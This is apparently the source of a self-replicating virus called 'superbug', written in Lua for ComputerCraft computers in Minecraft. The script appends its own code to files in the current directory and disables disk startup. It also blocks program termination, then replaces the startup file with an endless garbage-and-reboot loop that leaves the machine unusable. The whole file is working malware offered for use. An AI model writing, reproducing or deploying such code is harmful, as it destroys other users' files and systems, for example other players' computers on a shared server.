--superbug made by Hecker & A(YT: https://www.youtube.com/channel/UCKzfoGetJvmkkBuY8xmJxdg)
local args = {...}
settings.set("shell.allow_disk_startup", false)
settings.save()
if #args == 0 then args[1] = "" end -- no use
if #args == 0 then args[2] = "" end -- no use
local file = fs.open(shell.getRunningProgram(), "r")
local code = file.readAll() -- stores self. 
file:close()
-- inf
 
 
local function searchFiles(directory)
    local files = {}
    for _, file in ipairs(fs.list(directory)) do
        local fullPath = fs.combine(directory, file)
        if fs.isDir(fullPath) then
            if not fullPath:sub(1, 4) == "rom/" then
                local subFiles = searchFiles(fullPath)
                for _, subFile in ipairs(subFiles) do
                    table.insert(files, fs.combine(file, subFile))
                end
            end
        else
            -- Check if the file exists and read its contents
            if fs.exists(fullPath) then
                local handle = fs.open(fullPath, "r")
                if handle then
                    local contents = handle.readAll()
                    handle.close()
                    -- Check if the file contains "--inf" in its content
                    if not contents:find("--inf") then
                        table.insert(files, fullPath)
                    end
                end
            end
        end
    end
 
    return files
end
 
-- Start searching from the current directory
local currentDir = ""
local files = searchFiles(currentDir)
 
for _, file in ipairs(files) do
    local fl = fs.open(file, "a")
    fl.write(code)
    fl.write("--inf")
    fl.close()
end
 
os.pullEvent = os.pullEventRaw
 
term.setBackgroundColor(colors.blue)
term.setTextColor(colors.white)
term.clear()
 
 
local width, height = term.getSize()
local message = {
    "You've Been Infected by Superbug!",
    "Don't Reboot your computer, or  your bios is gone!"
}
 
-- Calculate the maximum width of the message lines
local maxWidth = 0
for _, line in ipairs(message) do maxWidth = math.max(maxWidth, #line) end
 
-- Print the message with aligned "|"
for i, line in ipairs(message) do
    local padding = string.rep(" ", (maxWidth - #line) / 2)
    term.setCursorPos((width - maxWidth) / 2, (height - #message) / 2 + i - 1)
    term.write("  " .. padding .. line .. padding)
end
 
 
local file = fs.open("startup", "w")
file.write("os.pullEvent = os.pullEventRaw term.setBackgroundColor(colors.blue) term.setTextColor(colors.white) term.clear() local width, height = term.getSize() for i = 1, 200 do term.setCursorPos(math.random(1, width), math.random(1, height)) term.write(math.random(0, 1)) end os.reboot()--inf")
file.close()
 
settings.set("shell.allow_disk_startup", false)
settings.save()
 
 
while true do 
    local a = read() 
    settings.set("shell.allow_disk_startup", false)
    settings.save()
end
 
 
 
